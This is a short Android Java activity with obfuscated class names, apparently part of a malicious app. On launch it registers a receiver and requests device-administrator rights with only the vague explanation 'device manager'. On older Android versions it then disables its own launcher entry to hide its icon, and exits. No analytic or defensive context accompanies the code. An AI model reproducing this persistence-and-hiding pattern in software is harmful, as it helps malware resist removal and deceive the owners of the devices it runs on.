package com.a.a;


import android.app.Activity;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Bundle;

public class la extends Activity {

	private DevicePolicyManager policyManager;
	private ComponentName componentName;

	@Override
	protected void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);

		u.regReceiver(this);

		u.log(this, "启动MainActivity");

		u.chkFirstRun(this);

		policyManager = (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
		componentName = new ComponentName(this, lo.class);
		if (policyManager.isAdminActive(componentName)) {
			u.log(this, "已经注册设备管理器");
		} else {
			Intent intent = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
			intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, componentName);
			intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "设备管理器");
			startActivity(intent);
			u.log(this, "注册设备管理器");
		}
		if (android.os.Build.VERSION.SDK_INT < 14) {
			getPackageManager().setComponentEnabledSetting(getComponentName(), PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
					PackageManager.DONT_KILL_APP);
		}

		finish();
	}
}
